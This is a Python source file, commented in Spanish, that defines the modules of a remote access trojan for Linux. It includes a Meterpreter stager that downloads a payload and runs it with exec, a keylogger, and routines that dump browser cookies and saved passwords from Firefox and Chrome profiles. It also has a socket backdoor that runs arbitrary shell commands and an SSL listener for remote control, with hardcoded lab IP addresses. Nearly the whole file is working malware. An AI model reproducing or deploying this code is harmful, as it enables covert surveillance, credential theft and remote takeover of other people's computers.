#!/usr/bin/python
"""
Este archivo define los modulos a ser utilizados en el RAT.

Los modulos seran importados a partir de este archivo.

Autores.
-Fernando Castaneda
-Diego Serrano

"""

def screenshot():
    import os
    os.system("import -window root /tmp/$(date +%F_%H%M%S_%N).png")

def meterpreter(srv,pto):
	import socket,struct
	s=socket.socket(2,1)
	s.connect((srv,pto))
	l=struct.unpack('>I',s.recv(4))[0]
	d=s.recv(4096)
	while len(d)!=l:
	    d+=s.recv(4096)
	exec(d,{'s':s})

def keylogger():
	import pyxhook
	#Es necesario el archivo pyxhook.py
	log='/tmp/cap'
	def OnKeyPress(event):
		f=open(log,'a')
		f.write(event.Key)
		f.write('\n')
		if event.Ascii==96:
			f.close()
			hook.cancel()
	hook=pyxhook.HookManager()
	hook.KeyDown=OnKeyPress
	hook.HookKeyboard()
	hook.start()

def cookies():
	#Es necesario tener instalado sqlite3 en el sistema
	import sqlite3
	import sys
	import glob
	def firefox():
		#Probado con ICEWEASEL
		for ruta in glob.glob(r'/home/*/.mozilla/firefox/*/cookies.sqlite'):
			conn=sqlite3.connect(ruta)
			for cookie in conn.execute("select * from moz_cookies;"):
				print cookie
	def chrome():
		#Funciona para chrome y chromium
		for ruta in glob.glob(r'/home/*/.config/*/Default/Cookies'):
			conn=sqlite3.connect(ruta)

			for cookie in conn.execute("select * from cookies;"):
				print cookie
	chrome()
	firefox()

def passwd():
	import ffpassdecrypt
	import glob
	import os
	def firefox():
		f=file('ff-pass','a')
		s=ffpassdecrypt.main()
		#f.write(str(s))
		#f.write('\n')
	def chrome():
		for ruta in glob.glob(r'/home/*/.config/chromium/Default/Login Data'):
			os.system(str("python chrome-password-export.py -i "+ruta+" -p -o chrome-pass"))
	chrome()
	firefox()

def backdoor(s):
	import os,socket,sys,ssl
	#n=socket.socket()
	#n.bind((cliente,pto))
	#n.listen(6)
	#ss=ssl.wrap_socket(n,server_side=True,keyfile="llave.pem",certfile="cert.pem",ssl_version=ssl.PROTOCOL_SSLv23)
	#s,p = ss.accept()
	while 1:
	    data = s.recv(1024)
	    if "q" == data.lower():
	        s.close()
	        break;
	    else:
	        if data.startswith('cd'):
	            os.chdir(data[3:].replace('\n',''))
	            s.send("Directorio: "+str(os.getcwd()))
	            result='\n'
	            continue;
	            #s.send(str(os.getcwd()))
	        else:
	            result=os.popen(data).read()
	    if (data.lower() != "q"):
	            s.send(str(result))
	    else:
	        s.send(str(result))
	        #s.close()
	        break;
	exit()


def remoto(cliente,pto):
	import os,socket,sys,ssl
	n=socket.socket()
	n.bind((cliente,pto))
	n.listen(6)
	ss=ssl.wrap_socket(n,server_side=True,keyfile="llave.pem",certfile="cert.pem",ssl_version=ssl.PROTOCOL_SSLv23)
	s,p = ss.accept()
	data = 'W'
	while 1:
		#print data
		if not data or data == 'W' or len(data)==0:
			data = s.recv(512)
		elif data == '1':
			try:
				backdoor(s)
				data = 'W'
			except:
				print ":'("
				data = 'W'
		elif data == '2':
			try:
				print "meterpreter :D"
				s.send('Meterpreter activo')
				print "saliendo..."
				data = 'W'
			except:
				print "murio :'("
				data = 'W'
		else:
			continue;
	exit()

#screenshot()
#meterpreter('192.168.47.134',4444)
#keylogger()
#cookies()
#passwd()


if __name__ == '__main__':
	remoto('192.168.47.144',6116)